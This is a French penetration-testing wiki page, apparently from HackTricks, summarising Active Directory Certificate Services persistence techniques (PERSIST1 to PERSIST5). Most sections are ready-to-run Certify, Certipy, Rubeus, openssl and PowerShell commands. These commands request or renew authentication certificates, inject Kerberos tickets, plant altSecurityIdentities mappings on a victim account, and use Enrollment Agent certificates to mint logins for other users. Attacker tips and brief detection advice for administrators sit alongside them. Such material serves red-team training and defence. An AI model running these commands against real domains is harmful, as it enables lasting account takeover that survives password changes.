# Persistance des comptes AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Ceci est un petit résumé des chapitres sur la persistance de compte de l'excellent travail de recherche disponible sur [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Comprendre le vol d'identifiants utilisateur actifs avec des certificats – PERSIST1

Dans un scénario où un certificat permettant l'authentification au domaine peut être demandé par un utilisateur, un attaquant a la possibilité de demander et de voler ce certificat pour maintenir une persistance sur le réseau. Par défaut, le template `User` dans Active Directory permet ce type de demandes, bien qu'il puisse parfois être désactivé.

En utilisant [Certify](https://github.com/GhostPack/Certify) ou [Certipy](https://github.com/ly4k/Certipy), vous pouvez rechercher des modèles activés qui permettent l'authentification client, puis en demander un :
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
La puissance d'un certificat réside dans sa capacité à s'authentifier en tant que l'utilisateur auquel il appartient, indépendamment des changements de mot de passe, tant que le certificat est valide.

Vous pouvez convertir un PEM en PFX et l'utiliser pour obtenir un TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Remarque : Combiné avec d'autres techniques (voir les sections THEFT), certificate-based auth permet un accès persistant sans toucher LSASS et même depuis des contextes non élevés.

## Gaining Machine Persistence with Certificates - PERSIST2

Si un attaquant dispose de privilèges élevés sur un hôte, il peut enregistrer le compte machine du système compromis pour obtenir un certificat en utilisant le template par défaut `Machine`. S'authentifier en tant que la machine permet d'activer S4U2Self pour les services locaux et peut assurer une persistance durable sur l'hôte :
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Étendre la persistance via le renouvellement de certificats - PERSIST3

Abuser des périodes de validité et de renouvellement des modèles de certificats permet à un attaquant de maintenir un accès à long terme. Si vous possédez un certificat précédemment émis et sa clé privée, vous pouvez le renouveler avant son expiration pour obtenir un nouveau justificatif d'authentification de longue durée sans laisser d'artefacts de requête supplémentaires liés au principal d'origine.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Conseil opérationnel : Suivez les durées de validité des fichiers PFX détenus par l'attaquant et renouvelez-les tôt. Le renouvellement peut aussi faire en sorte que les certificats mis à jour incluent l'extension moderne de mappage SID, les maintenant utilisables sous des règles de mappage DC plus strictes (voir section suivante).

## Implanter des mappages explicites de certificats (altSecurityIdentities) – PERSIST4

Si vous pouvez écrire dans l'attribut `altSecurityIdentities` d’un compte cible, vous pouvez mapper explicitement un certificat contrôlé par l'attaquant à ce compte. Cela persiste malgré les changements de mot de passe et, lorsqu'on utilise des formats de mappage robustes, reste fonctionnel sous l'application stricte des règles par les DC modernes.

Flux général :

1. Obtenez ou émettez un certificat client-auth que vous contrôlez (p.ex., inscrivez le template `User` en votre nom).
2. Extrayez un identifiant robuste du certificat (Issuer+Serial, SKI, ou SHA1-PublicKey).
3. Ajoutez un mappage explicite sur le principal victime dans `altSecurityIdentities` en utilisant cet identifiant.
4. Authentifiez-vous avec votre certificat ; le DC l'associe au compte de la victime via le mappage explicite.

Example (PowerShell) using a strong Issuer+Serial mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Ensuite, authentifiez-vous avec votre PFX. Certipy obtiendra directement un TGT :
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Construire des mappages `altSecurityIdentities` robustes

En pratique, **Issuer+Serial** et **SKI** sont les formats solides les plus faciles à construire à partir d'un certificat détenu par un attaquant. Cela compte après le 11 février 2025, lorsque les DCs passent par défaut en **Full Enforcement** et que les mappages faibles cessent d'être fiables.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Remarques
- Use strong mapping types only: `X509IssuerSerialNumber`, `X509SKI`, or `X509SHA1PublicKey`. Weak formats (Subject/Issuer, Subject-only, RFC822 email) are deprecated and can be blocked by DC policy.
- The mapping works on both **user** and **computer** objects, so write access to a computer account's `altSecurityIdentities` is enough to persist as that machine.
- The cert chain must build to a root trusted by the DC. Enterprise CAs in NTAuth are typically trusted; some environments also trust public CAs.
- Schannel authentication remains useful for persistence even when PKINIT fails because the DC lacks the Smart Card Logon EKU or returns `KDC_ERR_PADATA_TYPE_NOSUPP`.

Pour en savoir plus sur les mappages explicites faibles et les vecteurs d'attaque, voir :


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent comme persistance – PERSIST5

Si vous obtenez un certificat valide Certificate Request Agent/Enrollment Agent, vous pouvez créer à volonté de nouveaux certificats permettant la connexion au nom d'utilisateurs et conserver le PFX de l'agent hors ligne comme jeton de persistance. Flux d'abus :
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
La révocation du certificat d'agent ou des permissions du modèle est nécessaire pour supprimer cette persistance.

Notes opérationnelles
- Les versions récentes de `Certipy` prennent en charge à la fois `-on-behalf-of` et `-renew`, donc un attaquant possédant un PFX d'Enrollment Agent peut émettre puis renouveler des certificats leaf sans retoucher le compte cible initial.
- Si la récupération du TGT basée sur PKINIT n'est pas possible, le certificat on-behalf-of obtenu reste utilisable pour l'authentification Schannel avec `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## 2025 Strong Certificate Mapping Enforcement: Impact on Persistence

La KB5014754 de Microsoft a introduit Strong Certificate Mapping Enforcement sur les domain controllers. Depuis le 11 février 2025, les DCs sont par défaut en Full Enforcement, rejetant les mappings faibles/ambiguës. Implications pratiques :

- Les certificats antérieurs à 2022 qui n'ont pas l'extension de mappage SID peuvent échouer au mappage implicite lorsque les DCs sont en Full Enforcement. Les attaquants peuvent maintenir l'accès soit en renouvelant les certificats via AD CS (pour obtenir l'extension SID), soit en ajoutant un mapping explicite fort dans `altSecurityIdentities` (PERSIST4).
- Les mappings explicites utilisant des formats forts (Issuer+Serial, SKI, SHA1-PublicKey) continuent de fonctionner. Les formats faibles (Issuer/Subject, Subject-only, RFC822) peuvent être bloqués et doivent être évités pour la persistance.

Les administrateurs doivent surveiller et alerter sur :
- Les modifications de `altSecurityIdentities` et les émissions/renouvellements de certificats d'Enrollment Agent et d'User.
- Les journaux d'émission de la CA pour les requêtes on-behalf-of et les schémas de renouvellement inhabituels.

## Références

- Microsoft. KB5014754: Certificate-based authentication changes on Windows domain controllers (chronologie d'application et mappings forts).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (abus explicite de `altSecurityIdentities` sur des objets user/computer).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Référence des commandes (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. S'authentifier avec des certificats lorsque PKINIT n'est pas pris en charge.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
